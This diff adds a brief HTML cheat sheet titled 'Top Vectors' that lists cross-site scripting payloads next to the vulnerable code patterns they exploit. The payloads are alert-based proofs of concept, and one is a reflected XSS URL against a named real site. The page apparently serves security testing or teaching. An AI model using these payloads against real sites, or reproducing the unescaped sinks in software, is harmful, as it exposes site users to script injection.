@@ -1,0 +1,32 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Top Vectors</title>
+</head><body><b>Fragmented ?url='%20x=`&amp;name=`%20onmouseover='alert(1)</b><br/>
+ <br/>
+&lt;a href='&lt;?php echo htmlentities($url);?&gt;'/&gt;<br/>
+ &lt;?php echo htmlentities($name);?&gt;<br/>
+&lt;/a&gt;<br/>
+  <br/>
+<b>DOM based /index.php/&lt;script x&gt;alert(1)&lt;/script&gt;/</b><br/>
+<br/>
+&nbsp; document.write("&lt;a href='/suggestToFriend/?p="+location.href+"'&gt;");<br/>
+ <br/>
+<b>Inside event attributes ?id=alert(1)</b><br/>
+&lt;a href="#" onclick="deleteTopic($id)"&gt;<br/>
+<br/>
+<b>Strings that were modified in the backend</b><br/>
+&lt;script&gt;product=‘&lt;?=strtolower($prod)?&gt;’;&lt;/script&gt;<br/>
+<br/>
+<b>Attacks abusing charset peculiarities</b><br/>
+Unicode Stuff Already Mentioned!<br/>
+<br/>
+<b>Attacks that are not reflected in the same page</b><br/>
+https://www.dev.java.net/servlets/Search?mode=1&amp;resultsPerPage=%22%27%2F%3E%3Cscript%3Ealert%28'Props+To+TheRat'%29%3C%2Fscript%3E&amp;query=3&amp;scope=domain&amp;artifact=2&amp;Button=Search<br/>
+<br/>
+<b>Attacks that are made to content not loaded as HTML </b><br/>
+<br/>
+&lt;img src=“http://victim/newUser?name=&lt;script&gt;alert(1)&lt;/script&gt;”/&gt;<br/>
+&lt;iframe src=“http://victim/newUser”&gt;&lt;/iframe&gt;<br/>
+</body></html>
